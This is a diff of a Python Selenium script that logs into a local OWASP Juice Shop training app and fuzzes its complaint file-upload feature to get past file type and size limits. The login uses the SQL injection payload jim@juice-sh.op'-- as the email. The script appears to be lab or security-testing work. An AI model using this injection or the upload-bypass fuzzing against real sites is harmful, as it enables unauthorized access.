@@ -15,89 +15,83 @@ import aiohttp
 import asyncio
 import os
 
-# jim@juice-sh.op'--
-# 1234
-EMAIL = "jim@juice-sh.op'--"
-PASSWORD = "1234"
-ENTRY_ENDPOINT = 'http://localhost:3000/#/'
-FILE_COMPLAINT_ENDPOINT = 'http://localhost:3000/file-upload'
+def simulate_user(driver, entry_endpoint, email, password, max_size):
 
-data = ""
-headers = ""
+    try: 
+        driver.get(entry_endpoint)
 
-exposed_endpoints_arr = []
+        banner_button = WebDriverWait(driver, 3).until(
+            EC.presence_of_element_located((By.XPATH, '//*[@id="mat-dialog-0"]/app-welcome-banner/div/div[2]/button[2]'))
+        )
+        banner_button.click()
 
-driver = webdriver.Chrome()
-# driver.install()
-options = webdriver.ChromeOptions()
+        account = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-navbar/mat-toolbar/mat-toolbar-row/button[3]/span[1]/span')
+        account.click()
 
-def simulate_user(max_size):
+        login = WebDriverWait(driver, 100).until(
+            EC.presence_of_element_located((By.ID, "navbarLoginButton"))
+        )
+        login.click()
 
-    driver.get(ENTRY_ENDPOINT)
+        email_input = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[1]/div/div[1]/div[3]/input')
+        email_input.send_keys(email)
 
-    banner_button = WebDriverWait(driver, 3).until(
-        EC.presence_of_element_located((By.XPATH, '//*[@id="mat-dialog-0"]/app-welcome-banner/div/div[2]/button[2]'))
-    )
-    banner_button.click()
+        password_input = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[2]/div/div[1]/div[3]/input')
+        password_input.send_keys(password)
 
-    account = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-navbar/mat-toolbar/mat-toolbar-row/button[3]/span[1]/span')
-    account.click()
+        try_login = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/button[1]/span[1]')
+        try_login.click()
 
-    login = WebDriverWait(driver, 100).until(
-        EC.presence_of_element_located((By.ID, "navbarLoginButton"))
-    )
-    login.click()
+        side_panel = WebDriverWait(driver, 100).until(
+            EC.presence_of_element_located((By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-navbar/mat-toolbar/mat-toolbar-row/button[1]/span[1]/mat-icon'))
+        )
+        side_panel.click()
 
-    email_input = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[1]/div/div[1]/div[3]/input')
-    email_input.send_keys(EMAIL)
+        complaint = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav/div/sidenav/mat-nav-list/a[2]')
+        complaint.click()
 
-    password_input = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/mat-form-field[2]/div/div[1]/div[3]/input')
-    password_input.send_keys(PASSWORD)
-
-    try_login = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-login/div/mat-card/div/button[1]/span[1]')
-    try_login.click()
-
-    side_panel = WebDriverWait(driver, 100).until(
-        EC.presence_of_element_located((By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-navbar/mat-toolbar/mat-toolbar-row/button[1]/span[1]/mat-icon'))
-    )
-    side_panel.click()
-
-    complaint = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav/div/sidenav/mat-nav-list/a[2]')
-    complaint.click()
-
-    message = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]/mat-form-field[2]/div/div[1]/div[3]/textarea')
-    message.send_keys('message')
-    fuzz_client_side(max_size)
+        message = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]/mat-form-field[2]/div/div[1]/div[3]/textarea')
+        message.send_keys('message')
+    except: 
+        print("error in script please rerun")
+        return False
+    if (fuzz_client_side(driver, max_size) == False):
+        print("error in script please rerun")
+        return False
 
 
-def fuzz_client_side(max_size):
+def fuzz_client_side(driver, max_size):
 
-    directory = os.fsencode("./client_files_test")
+    try: 
+        directory = os.fsencode("./client_files_test")
 
-        # loop through all words in file that we'll try and find endpoints with
-    file_upload = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]/div/input')
-    
-    for file in os.listdir(directory):
+            # loop through all words in file that we'll try and find endpoints with
+        file_upload = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]/div/input')
+        
+        for file in os.listdir(directory):
 
-        file_name = os.fsdecode(file)
-        file_size = os.path.getsize(f'./client_files_test/{file_name}')
-        size_kb = file_size/(1024)  # convert bytes to KB
+            file_name = os.fsdecode(file)
+            file_size = os.path.getsize(f'./client_files_test/{file_name}')
+            size_kb = file_size/(1024)  # convert bytes to KB
 
-        if size_kb > max_size:
-            file = f'/client_files_test/{file_name}'
-            file_upload.send_keys(os.getcwd() + file)
-            
-            display_message = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]').text
+            if size_kb > max_size:
+                file = f'/client_files_test/{file_name}'
+                file_upload.send_keys(os.getcwd() + file)
+                
+                display_message = driver.find_element(By.XPATH, '/html/body/app-root/div/mat-sidenav-container/mat-sidenav-content/app-complaint/div/mat-card/div[2]').text
 
-            if (display_message != "Forbidden file type. Only PDF, ZIP allowed." and
-                display_message != "File too large. Maximum 100 KB allowed."):
-                print("success")
+                if (display_message != "Forbidden file type. Only PDF, ZIP allowed." and
+                    display_message != "File too large. Maximum 100 KB allowed."):
+                    print("success")
 
-    print("no exploits found on client side\n")
+        print("no exploits found on client side\n")
+    except: 
+        print("error in script")
+        return False
 
-def find_request(max_size):
+def find_request(driver, file_complaint_endpoint, max_size):
 
-    file = '/valid_file.pdf' 
+    file = '/client_files_test/valid_file.pdf' 
     file_upload = driver.find_element(By.ID, 'file')
     file_upload.send_keys(os.getcwd() + file)
     submit = driver.find_element(By.ID, 'submitButton')
@@ -108,7 +102,7 @@ def find_request(max_size):
 
     for request in driver.requests:
         # if request.response:
-        if (request.url == FILE_COMPLAINT_ENDPOINT):
+        if (request.url == file_complaint_endpoint):
             auth = request.headers['Authorization']
             # print(request.headers['Authorization'])
 
@@ -143,13 +137,18 @@ async def run_file_fuzzer(auth, max_size):
                     print("API request failed with file: " + file_name)
 
 def main():
+    EMAIL = "jim@juice-sh.op'--"
+    PASSWORD = "1234"
+    ENTRY_ENDPOINT = 'http://localhost:3000/#/'
+    FILE_COMPLAINT_ENDPOINT = 'http://localhost:3000/file-upload'
+    driver = webdriver.Chrome()
+
     max_size = float(input("What is the maximum file size (KB)? "))
     print("Runnning file upload fuzz tester on client side\n")
-    simulate_user(max_size)
+    if (simulate_user(driver, entry_endpoint=ENTRY_ENDPOINT, email=EMAIL, password=PASSWORD, max_size=max_size) == False):
+        return
     print("Runnning file upload fuzz tester on backend endpoint\n")
-    find_request(max_size)
-
-    # asyncio.run(run_fuzzer(TEST_ENDPOINT))
+    find_request(driver, file_complaint_endpoint=FILE_COMPLAINT_ENDPOINT, max_size=max_size)
 
 if __name__ == "__main__":
     main()
